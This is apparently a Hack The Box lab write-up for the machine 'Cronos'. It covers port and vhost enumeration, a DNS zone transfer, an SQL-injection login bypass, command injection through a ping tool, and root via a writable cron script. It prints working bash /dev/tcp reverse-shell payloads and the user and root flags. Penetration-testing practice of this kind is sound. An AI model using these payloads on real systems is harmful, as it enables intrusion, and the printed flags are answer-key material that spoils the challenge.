Hack The Box

Cronos

Level: Medium

1. Enumeration

I started with port enumeration:

sudo nmap -p- --open -sS --min-rate 1000 -Pn -n -vvv 10.10.10.13
  • -p- --open: Scans all ports and shows open ones.
  • -sS: SYN stealth scan.
  • -Pn: Disable ICMP Echo request.
  • --min-rate: How many packets should be sent simultaneously.
  • -n: disables DNS resolution.
  • -vvv: Maximum verbosity for real-time results.

Ports 22 (SSH), 53(DNS) and 80 (HTTP) are open. Service scan:

nmap -sC -sV -p22,53,80 10.10.10.13
  • -sC: Runs default scripts.
  • -sV: Enumerates for the version running.

The domain is cronos.htb. I updated my /etc/hosts:

echo "10.10.10.13 cronos.htb" | sudo tee -a /etc/hosts

Next step is vhost enumeration:

ffuf -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://cronos.htb/ -H 'Host: FUZZ.cronos.htb' -fs 11439
  • -w ~/path/to/subdomain.txt: This is the wordlist that is used to start the fuzzing.
  • -fs: Exclude responses with a specific file size.

We can get the same results by abusing the DNS port.

dig axfr @10.10.10.13 cronos.htb

Found a subdomain named admin it requires authentication.

2. Command Injection

I tried default credentials, but in the end I passed the login page with SQLi injection.

admin' --

I logged in and I can see the headers : Net Tool v0.1

It looks like a ping command, since there is a "traceroute" and an "execute" button.

Before I continue I open a listener to my machine.

nc -lvnp 4445

Then tried to do a Command Injection to get a reverse shell:

8.8.8.8; bash -c 'sh -i >& /dev/tcp/10.10.14.17/4445 0>&1'

Back to my listener, I have a shell as www-data.

Now I am ready to read the user flag.

User Flag da612bb76ce8f8a0a10d0775b4f36de1

3. Privilege Escalation

By visiting the /etc someone can find the crontab file.

There is an interesting cron job.

  • * * * * * root...runs every minute as root.

I can see that I have write permissions over this file.

I copied the content of the file and I added a small command in the top of it to get a reverse shell as root.

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.17/4446 0>&1'");

I set my listener and after about a minute I got the root shell.

nc -lvnp 4446
Root Flag 78fb9e40fb3fe525fc848d7d8275229e
